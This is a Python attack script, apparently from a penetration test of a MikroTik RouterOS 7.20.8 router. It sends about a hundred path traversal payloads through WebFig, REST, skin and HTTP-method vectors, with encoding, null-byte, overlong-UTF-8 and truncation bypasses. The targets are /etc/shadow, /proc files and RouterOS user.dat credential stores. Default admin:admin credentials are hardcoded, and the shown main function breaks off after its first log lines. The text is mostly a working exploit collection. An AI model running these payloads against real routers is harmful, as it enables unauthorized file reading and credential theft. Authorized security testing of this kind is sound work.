#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Path Traversal via www Binary / File Serving
Phase 9 (Novel Finding Hunting), Script: attack_www_traversal.py
Target: [REDACTED-INTERNAL-IP] ([REDACTED-CREDS])

Tests (~100 total):
  1. WebFig static file traversal (~15 tests)
  2. URL encoding bypass (~12 tests)
  3. Null byte injection (~10 tests)
  4. Unicode normalization (~8 tests)
  5. Backslash variants (~8 tests)
  6. Long path truncation (~6 tests)
  7. REST API file traversal (~10 tests)
  8. Skin/theme path manipulation (~8 tests)
  9. Known RouterOS paths (~12 tests)
 10. HTTP method with traversal (~10 tests)

Evidence: evidence/attack_www_traversal.json
"""

import json
import os
import socket
import sys
import time
import warnings
from datetime import datetime
from pathlib import Path

# Suppress SSL and urllib3 warnings
warnings.filterwarnings("ignore")

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import (
    EvidenceCollector, check_router_alive, pull_router_logs,
    log, EVIDENCE_DIR
)

# ── Target Configuration (override for [REDACTED-INTERNAL-IP]) ──────────────────────────
# Override the common module's TARGET for this script
import mikrotik_common
mikrotik_common.TARGET = "[REDACTED-INTERNAL-IP]"
mikrotik_common.ADMIN_USER = "admin"
mikrotik_common.ADMIN_PASS = "admin"

TARGET = "[REDACTED-INTERNAL-IP]"
PORT = 80
AUTH = ("admin", "admin")
BASE_URL = f"http://{TARGET}"

ec = EvidenceCollector("attack_www_traversal.py", phase="9-www-traversal")

# ── Sensitive file content signatures ────────────────────────────────────────
# If any of these appear in a response body, path traversal likely succeeded.
SENSITIVE_SIGNATURES = [
    b"root:",              # /etc/passwd
    b"shadow:",            # /etc/shadow
    b"$1$", b"$5$", b"$6$",  # crypt password hashes
    b"/bin/sh",            # shell reference in passwd
    b"nobody:",            # passwd entry
    b"BOOT_IMAGE",         # /proc/cmdline
    b"init=",              # /proc/cmdline
    b"RouterOS",           # RouterOS config files
    b"user=",              # user.dat patterns
    b"password=",          # user.dat patterns
    b"group=full",         # RouterOS user config
    b"MNDP",               # nova config
    b"nova",               # nova environment
    b"/flash/",            # flash references
    b"#!/",                # script shebang
]

# Known RouterOS filesystem paths worth targeting
ROUTEROS_PATHS = [
    "etc/passwd",
    "etc/shadow",
    "flash/rw/store/user.dat",
    "nova/etc/environment",
    "nova/etc/init",
    "rw/logs/",
    "rw/disk",
    "proc/self/cmdline",
    "proc/self/environ",
    "proc/self/maps",
    "proc/version",
    "flash/rw/store/user.dat",
]

# Known "not found" body patterns from WebFig
NOT_FOUND_PATTERNS = [b"Not Found", b"404", b"Error"]


# ── Helpers ──────────────────────────────────────────────────────────────────

def http_get(path, timeout=8, auth=AUTH, allow_redirects=True):
    """Send GET request, return (status, headers_dict, body_bytes, body_text).
    Returns (0, {}, b'', 'error_msg') on failure."""
    url = f"{BASE_URL}{path}"
    try:
        r = requests.get(
            url, auth=auth, timeout=timeout,
            verify=False, allow_redirects=allow_redirects)
        return r.status_code, dict(r.headers), r.content, r.text
    except Exception as e:
        return 0, {}, b"", str(e)


def raw_socket_request(path_bytes, timeout=5):
    """Send a raw HTTP request via socket (for null byte / binary path tests).
    path_bytes must be bytes. Returns (status_line, headers_str, body_bytes)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))

        # Build raw HTTP/1.1 request
        request = (
            b"GET " + path_bytes + b" HTTP/1.1\r\n"
            b"Host: " + TARGET.encode() + b"\r\n"
            b"Authorization: Basic YWRtaW46YWRtaW4=\r\n"  # admin:admin
            b"Connection: close\r\n"
            b"\r\n"
        )
        s.sendall(request)

        # Read response
        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        s.close()

        # Parse status line
        if b"\r\n" in response:
            status_line = response.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
        else:
            status_line = "No response"

        # Split headers and body
        if b"\r\n\r\n" in response:
            header_part, body = response.split(b"\r\n\r\n", 1)
            headers_str = header_part.decode("utf-8", errors="replace")
        else:
            headers_str = ""
            body = response

        return status_line, headers_str, body

    except Exception as e:
        return f"Error: {e}", "", b""


def raw_socket_method_request(method, path, timeout=5):
    """Send a raw HTTP request with arbitrary method via socket.
    Returns (status_line, headers_str, body_bytes)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))

        request = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Authorization: Basic YWRtaW46YWRtaW4=\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("utf-8")
        s.sendall(request)

        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        s.close()

        if b"\r\n" in response:
            status_line = response.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
        else:
            status_line = "No response"

        if b"\r\n\r\n" in response:
            header_part, body = response.split(b"\r\n\r\n", 1)
            headers_str = header_part.decode("utf-8", errors="replace")
        else:
            headers_str = ""
            body = response

        return status_line, headers_str, body

    except Exception as e:
        return f"Error: {e}", "", b""


def check_traversal_success(body_bytes, body_text, status_code):
    """Check if a response indicates successful path traversal.
    Returns (is_success: bool, matched_signatures: list)."""
    matched = []
    if status_code != 200:
        return False, matched

    for sig in SENSITIVE_SIGNATURES:
        if sig in body_bytes:
            matched.append(sig.decode("utf-8", errors="replace"))

    # Also check if the body is NOT a standard WebFig HTML page
    is_webfig_page = (b"<html" in body_bytes.lower()[:500] and
                      b"webfig" in body_bytes.lower()[:2000])

    if matched and not is_webfig_page:
        return True, matched

    return False, matched


def health_check(label):
    """Quick health check, record as test if router is down."""
    alive = check_router_alive()
    if not alive.get("alive"):
        ec.add_test(
            "health_check", f"Health: {label}",
            f"Router health check at {label}",
            "ROUTER DOWN",
            {"health": alive},
            anomaly=True,
        )
        log(f"  WARNING: Router appears down at {label} -- waiting 30s")
        time.sleep(30)
        alive = check_router_alive()
        if not alive.get("alive"):
            log("  FATAL: Router still down after 30s wait")
            return False
    return True


# =============================================================================
# Section 1: WebFig Static File Traversal (~15 tests)
# =============================================================================

def test_webfig_traversal():
    """Basic directory traversal via WebFig static file serving paths."""
    log("=" * 60)
    log("Section 1: WebFig Static File Traversal")
    log("=" * 60)

    traversal_vectors = [
        # Classic ../ traversal
        ("/webfig/../../etc/passwd", "Basic ../../etc/passwd"),
        ("/webfig/../../../etc/passwd", "Triple ../../../etc/passwd"),
        ("/webfig/../../../../etc/passwd", "Quad ../../../../etc/passwd"),
        ("/webfig/../../../etc/shadow", "Shadow file traversal"),
        ("/webfig/../../nova/etc/init", "RouterOS nova init config"),
        ("/webfig/../../rw/logs", "RouterOS rw/logs directory"),
        ("/webfig/../../flash/rw/store/user.dat", "RouterOS user.dat (password hashes)"),
        # Double-dot variants
        ("/webfig/....//....//etc/passwd", "Doubled-dot with extra slash"),
        ("/webfig/..../....//etc/passwd", "Four-dot variant"),
        ("/webfig/./../.././etc/passwd", "Dot-slash-dot-dot-slash mix"),
        ("/webfig/./../.././etc/passwd", "Interleaved dot-slash"),
        # Deeper traversal
        ("/webfig/../../../../../proc/version", "/proc/version via deep traversal"),
        ("/webfig/../../../../../proc/self/cmdline", "/proc/self/cmdline deep"),
        ("/webfig/../../../../../proc/self/environ", "/proc/self/environ deep"),
        # Trailing slash behavior
        ("/webfig/../../etc/passwd/", "Trailing slash on target"),
    ]

    for path, desc in traversal_vectors:
        status, hdrs, body_bytes, body_text = http_get(path)
        success, sigs = check_traversal_success(body_bytes, body_text, status)

        is_anomaly = success
        result = f"HTTP {status}, body_len={len(body_bytes)}"
        if success:
            result += f", TRAVERSAL SUCCESS: matched={sigs}"

        ec.add_test(
            "webfig_traversal", f"Traversal: {path}",
            desc,
            result,
            {"path": path, "status": status, "body_len": len(body_bytes),
             "body_preview": body_text[:500], "matched_sigs": sigs,
             "content_type": hdrs.get("Content-Type", ""),
             "traversal_success": success},
            anomaly=is_anomaly,
        )

        if success:
            ec.add_finding(
                "CRITICAL",
                f"Path traversal via WebFig static file serving",
                f"GET {path} returned sensitive file content. "
                f"Matched signatures: {sigs}. "
                f"Response body ({len(body_bytes)} bytes): {body_text[:200]}",
                cwe="CWE-22",
                cvss=9.1,
                reproduction_steps=[
                    f"curl -u admin:admin http://{TARGET}{path}",
                    "Verify response contains system file content"
                ],
            )

    if not health_check("after webfig traversal"):
        return


# =============================================================================
# Section 2: URL Encoding Bypass (~12 tests)
# =============================================================================

def test_url_encoding_bypass():
    """Attempt path traversal with various URL encoding schemes."""
    log("=" * 60)
    log("Section 2: URL Encoding Bypass")
    log("=" * 60)

    encoding_vectors = [
        # Single URL encoding
        ("/webfig/%2e%2e/%2e%2e/etc/passwd", "Single-encoded ../ (%2e%2e%2f)"),
        ("/webfig/%2e%2e%2f%2e%2e%2f/etc/passwd", "Full single-encode dots+slash"),
        ("/webfig/..%2f..%2f..%2fetc/passwd", "Encoded slash only (..%2f)"),
        ("/webfig/%2e%2e/etc/passwd", "Single level encoded"),
        # Double URL encoding
        ("/webfig/%252e%252e/%252e%252e/etc/passwd", "Double-encoded (%252e%252e)"),
        ("/webfig/..%252f..%252f/etc/passwd", "Double-encoded slash (%252f)"),
        ("/webfig/%252e%252e%252f%252e%252e%252f/etc/passwd", "Full double-encode"),
        # Mixed encoding (partial)
        ("/webfig/%2e%2e/../etc/passwd", "Mixed: encoded first, raw second"),
        ("/webfig/../%2e%2e/etc/passwd", "Mixed: raw first, encoded second"),
        ("/webfig/..%2fetc/passwd", "Partial: ..%2f (one level)"),
        # Encoded special characters
        ("/webfig/%2e%2e%5c%2e%2e%5cetc%5cpasswd", "Encoded backslash (%5c)"),
        # Case variations in hex encoding
        ("/webfig/%2E%2E/%2E%2E/etc/passwd", "Uppercase hex encoding (%2E)"),
    ]

    for path, desc in encoding_vectors:
        status, hdrs, body_bytes, body_text = http_get(path)
        success, sigs = check_traversal_success(body_bytes, body_text, status)

        ec.add_test(
            "url_encoding", f"Encoding: {desc[:50]}",
            desc,
            f"HTTP {status}, body_len={len(body_bytes)}, traversal={success}",
            {"path": path, "status": status, "body_len": len(body_bytes),
             "body_preview": body_text[:500], "matched_sigs": sigs,
             "content_type": hdrs.get("Content-Type", ""),
             "traversal_success": success},
            anomaly=success,
        )

        if success:
            ec.add_finding(
                "CRITICAL",
                f"Path traversal via URL encoding bypass",
                f"GET {path} returned sensitive file content "
                f"using encoding bypass. Matched: {sigs}",
                cwe="CWE-22",
                cvss=9.1,
            )

    if not health_check("after url encoding tests"):
        return


# =============================================================================
# Section 3: Null Byte Injection (~10 tests)
# =============================================================================

def test_null_byte_injection():
    """Null byte injection to truncate path validation.
    Uses raw sockets because requests library strips null bytes."""
    log("=" * 60)
    log("Section 3: Null Byte Injection")
    log("=" * 60)

    null_vectors = [
        # Null byte before extension to bypass extension checks
        (b"/webfig/../../etc/passwd%00.html", "Null before .html extension"),
        (b"/webfig/../../etc/passwd%00.css", "Null before .css extension"),
        (b"/webfig/../../etc/passwd%00.js", "Null before .js extension"),
        (b"/webfig/../../etc/passwd%00.png", "Null before .png extension"),
        # Raw null byte (not URL-encoded)
        (b"/webfig/../../etc/passwd\x00.html", "Raw null byte before .html"),
        (b"/webfig/../../etc/passwd\x00", "Raw null at end of path"),
        # Null in traversal component
        (b"/webfig/..\x00./etc/passwd", "Null inside traversal sequence"),
        (b"/webfig/%00../../etc/passwd", "Null before traversal"),
        # Double-encoded null
        (b"/webfig/../../etc/passwd%2500.html", "Double-encoded null (%2500)"),
        # Null at various positions
        (b"/webfig/../../etc/pas%00swd", "Null in middle of filename"),
    ]

    for path_bytes, desc in null_vectors:
        status_line, headers_str, body = raw_socket_request(path_bytes)

        # Extract status code from status line
        status_code = 0
        try:
            parts = status_line.split()
            if len(parts) >= 2:
                status_code = int(parts[1])
        except (ValueError, IndexError):
            pass

        success, sigs = check_traversal_success(body, body.decode("utf-8", errors="replace"), status_code)

        ec.add_test(
            "null_byte", f"Null: {desc[:50]}",
            desc,
            f"Status: {status_line}, body_len={len(body)}, traversal={success}",
            {"path": path_bytes.decode("utf-8", errors="replace"),
             "status_line": status_line, "status_code": status_code,
             "body_len": len(body),
             "body_preview": body[:500].decode("utf-8", errors="replace"),
             "matched_sigs": sigs,
             "traversal_success": success},
            anomaly=success,
        )

        if success:
            ec.add_finding(
                "CRITICAL",
                f"Path traversal via null byte injection",
                f"Null byte injection ({desc}) returned sensitive content. "
                f"Matched: {sigs}",
                cwe="CWE-158",
                cvss=9.1,
            )

    if not health_check("after null byte tests"):
        return


# =============================================================================
# Section 4: Unicode Normalization (~8 tests)
# =============================================================================

def test_unicode_normalization():
    """Test overlong UTF-8 encodings and Unicode normalization attacks."""
    log("=" * 60)
    log("Section 4: Unicode Normalization Attacks")
    log("=" * 60)

    unicode_vectors = [
        # Overlong UTF-8 for dot (.) = 0x2e
        # 2-byte overlong: C0 AE
        (b"/webfig/\xc0\xae\xc0\xae/\xc0\xae\xc0\xae/etc/passwd",
         "Overlong 2-byte dot-dot (%c0%ae%c0%ae/)"),
        # URL-encoded overlong
        (b"/webfig/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
         "URL-encoded overlong dot (%c0%ae)"),
        # 3-byte overlong for dot: E0 80 AE
        (b"/webfig/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/etc/passwd",
         "3-byte overlong dot (%e0%80%ae)"),
        # Overlong slash (/) = 0x2f -> C0 AF
        (b"/webfig/..%c0%af..%c0%afetc%c0%afpasswd",
         "Overlong slash (%c0%af)"),
        # Mixed overlong dot + normal slash
        (b"/webfig/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
         "Overlong dots with normal slashes"),
        # UTF-8 fullwidth equivalents
        # Fullwidth period U+FF0E -> EF BC 8E
        (b"/webfig/\xef\xbc\x8e\xef\xbc\x8e/\xef\xbc\x8e\xef\xbc\x8e/etc/passwd",
         "Fullwidth period (U+FF0E) dot-dot"),
        # Fullwidth solidus U+FF0F -> EF BC 8F
        (b"/webfig/..\xef\xbc\x8f..\xef\xbc\x8fetc\xef\xbc\x8fpasswd",
         "Fullwidth solidus (U+FF0F) as slash"),
        # URL-encoded fullwidth
        (b"/webfig/%ef%bc%8e%ef%bc%8e/%ef%bc%8e%ef%bc%8e/etc/passwd",
         "URL-encoded fullwidth period"),
    ]

    for path_bytes, desc in unicode_vectors:
        status_line, headers_str, body = raw_socket_request(path_bytes)

        status_code = 0
        try:
            parts = status_line.split()
            if len(parts) >= 2:
                status_code = int(parts[1])
        except (ValueError, IndexError):
            pass

        success, sigs = check_traversal_success(body, body.decode("utf-8", errors="replace"), status_code)

        ec.add_test(
            "unicode_norm", f"Unicode: {desc[:50]}",
            desc,
            f"Status: {status_line}, body_len={len(body)}, traversal={success}",
            {"path": path_bytes.decode("utf-8", errors="replace"),
             "path_hex": path_bytes.hex(),
             "status_line": status_line, "status_code": status_code,
             "body_len": len(body),
             "body_preview": body[:500].decode("utf-8", errors="replace"),
             "matched_sigs": sigs,
             "traversal_success": success},
            anomaly=success,
        )

        if success:
            ec.add_finding(
                "CRITICAL",
                f"Path traversal via Unicode normalization",
                f"Unicode normalization bypass ({desc}) returned sensitive content. "
                f"Matched: {sigs}",
                cwe="CWE-176",
                cvss=9.1,
            )

    if not health_check("after unicode tests"):
        return


# =============================================================================
# Section 5: Backslash Variants (~8 tests)
# =============================================================================

def test_backslash_variants():
    """Test backslash as path separator (Windows-style traversal)."""
    log("=" * 60)
    log("Section 5: Backslash Variants")
    log("=" * 60)

    backslash_vectors = [
        # Pure backslash traversal
        ("/webfig/..\\..\\etc\\passwd", "Backslash traversal ..\\..\\"),
        ("/webfig/..\\..\\..\\etc\\passwd", "Triple backslash traversal"),
        # Mixed forward/backslash
        ("/webfig/../..\\etc/passwd", "Mixed: ../ then ..\\"),
        ("/webfig/..\\../etc\\passwd", "Mixed: ..\\ then ../"),
        ("/webfig/..\\../..\\etc/passwd", "Alternating slash types"),
        # URL-encoded backslash (%5c)
        ("/webfig/..%5c..%5cetc%5cpasswd", "URL-encoded backslash (%5c)"),
        ("/webfig/..%5C..%5Cetc%5Cpasswd", "Uppercase encoded backslash (%5C)"),
        # Double-encoded backslash
        ("/webfig/..%255c..%255cetc%255cpasswd", "Double-encoded backslash (%255c)"),
    ]

    for path, desc in backslash_vectors:
        status, hdrs, body_bytes, body_text = http_get(path)
        success, sigs = check_traversal_success(body_bytes, body_text, status)

        ec.add_test(
            "backslash", f"Backslash: {desc[:50]}",
            desc,
            f"HTTP {status}, body_len={len(body_bytes)}, traversal={success}",
            {"path": path, "status": status, "body_len": len(body_bytes),
             "body_preview": body_text[:500], "matched_sigs": sigs,
             "content_type": hdrs.get("Content-Type", ""),
             "traversal_success": success},
            anomaly=success,
        )

        if success:
            ec.add_finding(
                "CRITICAL",
                f"Path traversal via backslash variant",
                f"GET {path} returned sensitive file content. Matched: {sigs}",
                cwe="CWE-22",
                cvss=9.1,
            )

    if not health_check("after backslash tests"):
        return


# =============================================================================
# Section 6: Long Path Truncation (~6 tests)
# =============================================================================

def test_long_path_truncation():
    """Test if very long path components truncate traversal protection."""
    log("=" * 60)
    log("Section 6: Long Path Truncation")
    log("=" * 60)

    truncation_vectors = [
        # Long component then traversal -- if the server truncates at 255
        # chars, the ../ might survive past the check
        (f"/webfig/{'A' * 255}/../../../etc/passwd",
         "255-char component + traversal"),
        (f"/webfig/{'A' * 512}/../../../etc/passwd",
         "512-char component + traversal"),
        (f"/webfig/{'A' * 1024}/../../../etc/passwd",
         "1024-char component + traversal"),
        # Many short directory components
        ("/webfig/" + "/".join(["x"] * 100) + "/../../" * 103 + "etc/passwd",
         "100 dirs deep then 103 levels up"),
        # Long filename before traversal
        (f"/webfig/{'.' * 300}/../../etc/passwd",
         "300 dots then traversal"),
        # Path at exactly buffer boundaries
        (f"/webfig/{'A' * 4093}/../../../etc/passwd",
         "4093-char pad (near 4096 page boundary)"),
    ]

    for path, desc in truncation_vectors:
        status, hdrs, body_bytes, body_text = http_get(path, timeout=15)
        success, sigs = check_traversal_success(body_bytes, body_text, status)

        ec.add_test(
            "long_path", f"Long path: {desc[:50]}",
            desc,
            f"HTTP {status}, body_len={len(body_bytes)}, traversal={success}, path_len={len(path)}",
            {"path_len": len(path), "status": status,
             "body_len": len(body_bytes),
             "body_preview": body_text[:500] if len(body_text) <= 500 else body_text[:500],
             "matched_sigs": sigs,
             "content_type": hdrs.get("Content-Type", ""),
             "traversal_success": success},
            anomaly=success or (status >= 500),
        )

        if success:
            ec.add_finding(
                "CRITICAL",
                f"Path traversal via long path truncation",
                f"Long path ({len(path)} chars) bypassed traversal protection. "
                f"Matched: {sigs}",
                cwe="CWE-22",
                cvss=9.1,
            )
        elif status >= 500:
            ec.add_finding(
                "MEDIUM",
                f"Server error from long path ({len(path)} chars)",
                f"HTTP {status} returned for {len(path)}-char path — "
                f"possible buffer overflow or resource exhaustion",
                cwe="CWE-120",
            )

    if not health_check("after long path tests"):
        return


# =============================================================================
# Section 7: REST API File Traversal (~10 tests)
# =============================================================================

def test_rest_api_traversal():
    """Test path traversal through the REST API /rest/ endpoints."""
    log("=" * 60)
    log("Section 7: REST API File Traversal")
    log("=" * 60)

    rest_vectors = [
        # Direct path traversal in REST URL
        ("/rest/../../etc/passwd", "REST ../../etc/passwd"),
        ("/rest/../../../etc/passwd", "REST ../../../etc/passwd"),
        ("/rest/file/../../etc/passwd", "REST /file/../../etc/passwd"),
        # URL-encoded in REST path
        ("/rest/%2e%2e/%2e%2e/etc/passwd", "REST encoded traversal"),
        ("/rest/..%2f..%2f..%2fetc/passwd", "REST encoded slash traversal"),
        # Via file endpoint parameters
        ("/rest/file?name=../../etc/passwd", "REST file name param traversal"),
        ("/rest/file?name=../../../flash/rw/store/user.dat", "REST file name user.dat"),
        # Via export/backup endpoints
        ("/rest/export?file=../../etc/passwd", "REST export file param"),
        # Through /rest/../webfig cross-path
        ("/rest/../webfig/../../etc/passwd", "REST to WebFig cross-path"),
        # Double-slash confusion
        ("/rest//../../etc/passwd", "REST double-slash traversal"),
    ]

    for path, desc in rest_vectors:
        status, hdrs, body_bytes, body_text = http_get(path)
        success, sigs = check_traversal_success(body_bytes, body_text, status)

        # Also flag if we get JSON file listing data unexpectedly
        json_file_leak = False
        if status == 200:
            try:
                data = json.loads(body_text)
                if isinstance(data, list) and any("name" in item for item in data if isinstance(item, dict)):
                    json_file_leak = True
            except (json.JSONDecodeError, TypeError):
                pass

        ec.add_test(
            "rest_traversal", f"REST: {desc[:50]}",
            desc,
            f"HTTP {status}, body_len={len(body_bytes)}, traversal={success}",
            {"path": path, "status": status, "body_len": len(body_bytes),
             "body_preview": body_text[:500], "matched_sigs": sigs,
             "content_type": hdrs.get("Content-Type", ""),
             "traversal_success": success,
             "json_file_leak": json_file_leak},
            anomaly=success or json_file_leak,
        )

        if success:
            ec.add_finding(
                "CRITICAL",
                f"Path traversal via REST API endpoint",
                f"GET {path} returned sensitive file content via REST API. "
                f"Matched: {sigs}",
                cwe="CWE-22",
                cvss=9.1,
            )

    if not health_check("after REST traversal tests"):
        return


# =============================================================================
# Section 8: Skin/Theme Path Manipulation (~8 tests)
# =============================================================================

def test_skin_theme_traversal():
    """Test path traversal via WebFig skin/theme/resource loading parameters."""
    log("=" * 60)
    log("Section 8: Skin/Theme Path Manipulation")
    log("=" * 60)

    skin_vectors = [
        # Skin parameter injection
        ("/webfig/?skin=../../etc/passwd", "Skin param with traversal"),
        ("/webfig/?skin=../../../etc/shadow", "Skin param to shadow"),
        # Language/locale file loading
        ("/webfig/?lang=../../etc/passwd", "Lang param with traversal"),
        ("/webfig/?lang=../../../proc/version", "Lang param to proc/version"),
        # Resource/asset loading paths
        ("/webfig/skins/../../etc/passwd", "Skins directory traversal"),
        ("/webfig/css/../../etc/passwd", "CSS directory traversal"),
        ("/webfig/js/../../etc/passwd", "JS directory traversal"),
        # WebFig internal resource references
        ("/webfig/mikrotik.ico/../../../etc/passwd", "Icon path traversal"),
    ]

    for path, desc in skin_vectors:
        status, hdrs, body_bytes, body_text = http_get(path)
        success, sigs = check_traversal_success(body_bytes, body_text, status)

        ec.add_test(
            "skin_theme", f"Skin: {desc[:50]}",
            desc,
            f"HTTP {status}, body_len={len(body_bytes)}, traversal={success}",
            {"path": path, "status": status, "body_len": len(body_bytes),
             "body_preview": body_text[:500], "matched_sigs": sigs,
             "content_type": hdrs.get("Content-Type", ""),
             "traversal_success": success},
            anomaly=success,
        )

        if success:
            ec.add_finding(
                "CRITICAL",
                f"Path traversal via skin/theme resource loading",
                f"GET {path} returned sensitive file content via "
                f"skin/theme parameter. Matched: {sigs}",
                cwe="CWE-22",
                cvss=9.1,
            )

    if not health_check("after skin/theme tests"):
        return


# =============================================================================
# Section 9: Known RouterOS Paths (~12 tests)
# =============================================================================

def test_known_routeros_paths():
    """Attempt to access known RouterOS filesystem paths directly and via traversal."""
    log("=" * 60)
    log("Section 9: Known RouterOS Filesystem Paths")
    log("=" * 60)

    # Each entry: (traversal_path, direct_path, description)
    routeros_targets = [
        # Password/credential stores
        ("/webfig/../../../flash/rw/store/user.dat",
         "/flash/rw/store/user.dat",
         "RouterOS user credentials database"),
        ("/webfig/../../../rw/store/user.dat",
         "/rw/store/user.dat",
         "RouterOS user.dat (alt path)"),
        # System configuration
        ("/webfig/../../../nova/etc/environment",
         "/nova/etc/environment",
         "RouterOS nova environment config"),
        ("/webfig/../../../nova/etc/init",
         "/nova/etc/init",
         "RouterOS nova init script"),
        ("/webfig/../../../nova/etc/mpd.conf",
         "/nova/etc/mpd.conf",
         "RouterOS MPD configuration"),
        # Log files
        ("/webfig/../../../rw/logs/LOG",
         "/rw/logs/LOG",
         "RouterOS system log file"),
        # Linux system files
        ("/webfig/../../../proc/self/cmdline",
         "/proc/self/cmdline",
         "Process command line (www binary path)"),
        ("/webfig/../../../proc/self/maps",
         "/proc/self/maps",
         "Process memory map (ASLR defeat)"),
        ("/webfig/../../../proc/self/environ",
         "/proc/self/environ",
         "Process environment variables"),
        ("/webfig/../../../proc/version",
         "/proc/version",
         "Linux kernel version"),
        # Firmware/package data
        ("/webfig/../../../flash/rw/DEFCONF",
         "/flash/rw/DEFCONF",
         "RouterOS default configuration"),
        # Direct access without WebFig prefix
        ("/../../../etc/passwd",
         "/etc/passwd",
         "Direct root traversal (no prefix)"),
    ]

    for traversal_path, direct_path, desc in routeros_targets:
        # Test via traversal
        status_t, hdrs_t, body_t, text_t = http_get(traversal_path)
        success_t, sigs_t = check_traversal_success(body_t, text_t, status_t)

        # Test via direct path
        status_d, hdrs_d, body_d, text_d = http_get(direct_path)
        success_d, sigs_d = check_traversal_success(body_d, text_d, status_d)

        ec.add_test(
            "routeros_paths", f"ROS path: {desc[:45]}",
            f"{desc} -- traversal={traversal_path}, direct={direct_path}",
            f"Traversal: HTTP {status_t} (len={len(body_t)}), "
            f"Direct: HTTP {status_d} (len={len(body_d)}), "
            f"traversal_success={success_t}, direct_success={success_d}",
            {"traversal_path": traversal_path, "direct_path": direct_path,
             "traversal_status": status_t, "direct_status": status_d,
             "traversal_body_len": len(body_t), "direct_body_len": len(body_d),
             "traversal_preview": text_t[:300], "direct_preview": text_d[:300],
             "traversal_sigs": sigs_t, "direct_sigs": sigs_d,
             "traversal_success": success_t, "direct_success": success_d},
            anomaly=success_t or success_d,
        )

        if success_t:
            ec.add_finding(
                "CRITICAL",
                f"RouterOS file accessed via traversal: {direct_path}",
                f"GET {traversal_path} returned content from {direct_path}. "
                f"Matched: {sigs_t}. Preview: {text_t[:200]}",
                cwe="CWE-22",
                cvss=9.1,
            )
        if success_d:
            ec.add_finding(
                "HIGH",
                f"RouterOS file directly accessible: {direct_path}",
                f"GET {direct_path} returned system file content without traversal. "
                f"Matched: {sigs_d}",
                cwe="CWE-552",
                cvss=7.5,
            )

    if not health_check("after RouterOS path tests"):
        return


# =============================================================================
# Section 10: HTTP Method with Traversal (~10 tests)
# =============================================================================

def test_method_traversal():
    """Test traversal paths with various HTTP methods (PUT, DELETE, PATCH, etc.)."""
    log("=" * 60)
    log("Section 10: HTTP Method with Traversal Paths")
    log("=" * 60)

    traversal_path = "/webfig/../../etc/passwd"
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD",
               "TRACE", "PROPFIND", "MKCOL"]

    for method in methods:
        status_line, headers_str, body = raw_socket_method_request(method, traversal_path)

        status_code = 0
        try:
            parts = status_line.split()
            if len(parts) >= 2:
                status_code = int(parts[1])
        except (ValueError, IndexError):
            pass

        body_text = body.decode("utf-8", errors="replace")
        success, sigs = check_traversal_success(body, body_text, status_code)

        # For PUT/DELETE, check if we can write/delete system files
        write_anomaly = (method in ["PUT", "DELETE", "PATCH"] and
                         status_code in [200, 201, 204])

        ec.add_test(
            "method_traversal", f"{method} traversal",
            f"{method} {traversal_path} -- test traversal with {method} method",
            f"Status: {status_line}, body_len={len(body)}, "
            f"traversal={success}, write_anomaly={write_anomaly}",
            {"method": method, "path": traversal_path,
             "status_line": status_line, "status_code": status_code,
             "body_len": len(body),
             "body_preview": body_text[:500],
             "matched_sigs": sigs,
             "traversal_success": success,
             "write_anomaly": write_anomaly},
            anomaly=success or write_anomaly,
        )

        if success:
            ec.add_finding(
                "CRITICAL",
                f"Path traversal via {method} method",
                f"{method} {traversal_path} returned sensitive content. "
                f"Matched: {sigs}",
                cwe="CWE-22",
                cvss=9.1,
            )

        if write_anomaly:
            ec.add_finding(
                "CRITICAL",
                f"File write/delete via {method} with traversal",
                f"{method} {traversal_path} returned {status_code} — "
                f"potential arbitrary file write or deletion",
                cwe="CWE-434",
                cvss=9.8,
            )

    if not health_check("after method traversal tests"):
        return


# =============================================================================
# Baseline: Establish normal responses for comparison
# =============================================================================

def establish_baseline():
    """Get baseline responses for WebFig and REST API to compare against."""
    log("=" * 60)
    log("Establishing response baselines")
    log("=" * 60)

    baseline = {}

    # Normal WebFig page
    status, hdrs, body, text = http_get("/webfig/")
    baseline["webfig_normal"] = {
        "status": status, "body_len": len(body),
        "content_type": hdrs.get("Content-Type", ""),
    }
    log(f"  WebFig normal: HTTP {status}, {len(body)} bytes, CT={hdrs.get('Content-Type', '')}")

    # WebFig 404
    status, hdrs, body, text = http_get("/webfig/nonexistent_file_xyz.html")
    baseline["webfig_404"] = {
        "status": status, "body_len": len(body),
        "content_type": hdrs.get("Content-Type", ""),
        "body_preview": text[:200],
    }
    log(f"  WebFig 404: HTTP {status}, {len(body)} bytes")

    # REST API normal
    status, hdrs, body, text = http_get("/rest/system/resource")
    baseline["rest_normal"] = {
        "status": status, "body_len": len(body),
        "content_type": hdrs.get("Content-Type", ""),
    }
    log(f"  REST normal: HTTP {status}, {len(body)} bytes")

    # Root path
    status, hdrs, body, text = http_get("/")
    baseline["root"] = {
        "status": status, "body_len": len(body),
        "content_type": hdrs.get("Content-Type", ""),
    }
    log(f"  Root: HTTP {status}, {len(body)} bytes")

    ec.add_test(
        "baseline", "Response baseline",
        "Establish baseline response patterns for comparison",
        f"WebFig={baseline['webfig_normal']['status']}, "
        f"404={baseline['webfig_404']['status']}, "
        f"REST={baseline['rest_normal']['status']}, "
        f"Root={baseline['root']['status']}",
        {"baseline": baseline},
        anomaly=False,
    )

    return baseline


# =============================================================================
# Main
# =============================================================================

def main():
    log("MikroTik RouterOS CHR 7.20.8 — Path Traversal Assessment")
    log(f"Target: {TARGET}:{PORT} ([REDACTED-CREDS])")
    log("=" * 60)

